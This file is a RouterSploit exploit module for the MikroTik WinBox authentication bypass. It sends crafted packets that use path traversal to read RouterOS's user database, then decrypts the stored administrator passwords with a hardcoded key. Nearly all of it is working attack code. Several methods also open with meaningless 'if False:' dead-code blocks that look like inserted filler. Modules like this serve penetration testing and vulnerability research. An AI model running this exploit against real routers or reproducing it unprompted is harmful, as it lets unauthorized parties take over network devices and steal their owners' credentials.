from hashlib import md5
from routersploit.core.exploit import *
from routersploit.core.tcp.tcp_client import TCPClient

class Exploit(TCPClient):
    __info__ = {'name': 'Mikrotik WinBox Auth Bypass - Creds Disclosure', 'description': 'Module bypass authentication through WinBox service in Mikrotik devices versions from 6.29 (release date: 2015/28/05) to 6.42 (release date 2018/04/20) and retrieves administrative credentials.', 'authors': ('Alireza Mosajjal', 'Mostafa Yalpaniyan', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://n0p.me/winbox-bug-dissection/', 'https://github.com/BasuCert/WinboxPoC'), 'devices': ('Mikrotik RouterOS versions from 6.29 (release date: 2015/28/05) to 6.42 (release date 2018/04/20)',)}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(8291, 'Target WinBox service')

    def __init__(self):
        if False:
            print('Hello World!')
        self.packet_a = b'h\x01\x00fM2\x05\x00\xff\x01\x06\x00\xff\t\x05\x07\x00\xff\t\x07\x01\x00\x00!5/////./..//////./..//////./../flash/rw/store/user.dat\x02\x00\xff\x88\x02\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\xff\x88\x02\x00\x02\x00\x00\x00\x02\x00\x00\x00'
        self.packet_b = b';\x01\x009M2\x05\x00\xff\x01\x06\x00\xff\t\x06\x01\x00\xfe\t5\x02\x00\x00\x08\x00\x80\x00\x00\x07\x00\xff\t\x04\x02\x00\xff\x88\x02\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\xff\x88\x02\x00\x02\x00\x00\x00\x02\x00\x00\x00'

    def run(self):
        if False:
            while True:
                i = 10
        creds = self.get_creds()
        if creds:
            print_success('Target seems to be vulnerable')
            print_status('Dumping credentials')
            print_table(('Username', 'Password'), *creds)
        else:
            print_error('Exploit failed - target does not seem to be vulnerable')

    @mute
    def check(self):
        if False:
            for i in range(10):
                print('nop')
        creds = self.get_creds()
        if creds:
            return True
        return False

    def get_creds(self):
        if False:
            for i in range(10):
                print('nop')
        creds = []
        tcp_client = self.tcp_create()
        tcp_client.connect()
        tcp_client.send(self.packet_a)
        data = tcp_client.recv(1024)
        if not data or len(data) < 39:
            return None
        packet = self.packet_b[:19] + data[38:39] + self.packet_b[20:]
        tcp_client.send(packet)
        data = tcp_client.recv(1024)
        if not data:
            return None
        tcp_client.close()
        creds = self.get_pair(data)
        if not creds:
            return None
        return creds

    def decrypt_password(self, user, pass_enc):
        if False:
            while True:
                i = 10
        key = md5(user + b'283i4jfkai3389').digest()
        passw = ''
        for i in range(0, len(pass_enc)):
            passw += chr(pass_enc[i] ^ key[i % len(key)])
        return passw.split('\x00')[0]

    def extract_user_pass_from_entry(self, entry):
        if False:
            i = 10
            return i + 15
        user_data = entry.split(b'\x01\x00\x00!')[1]
        pass_data = entry.split(b'\x11\x00\x00!')[1]
        user_len = user_data[0]
        pass_len = pass_data[0]
        username = user_data[1:1 + user_len]
        password = pass_data[1:1 + pass_len]
        return (username, password)

    def get_pair(self, data):
        if False:
            while True:
                i = 10
        user_list = []
        entries = data.split(b'M2')[1:]
        for entry in entries:
            try:
                (user, pass_encrypted) = self.extract_user_pass_from_entry(entry)
            except Exception:
                continue
            pass_plain = self.decrypt_password(user, pass_encrypted)
            user = user.decode('ascii')
            user_list.append((user, pass_plain))
        return user_list